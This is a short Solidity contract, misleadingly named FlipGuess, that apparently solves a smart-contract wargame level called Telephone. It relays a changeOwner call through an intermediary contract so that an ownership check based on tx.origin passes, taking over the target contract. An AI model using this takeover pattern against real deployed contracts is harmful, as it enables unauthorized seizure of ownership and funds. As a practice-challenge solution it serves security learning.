// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external ;
}

contract FlipGuess {
    ITelephone Telephone;

    constructor(address _contractAddress) {
        Telephone = ITelephone(_contractAddress);
    }

    function changeOwner(address _newOwner) public{
      Telephone.changeOwner(_newOwner);
    }
}

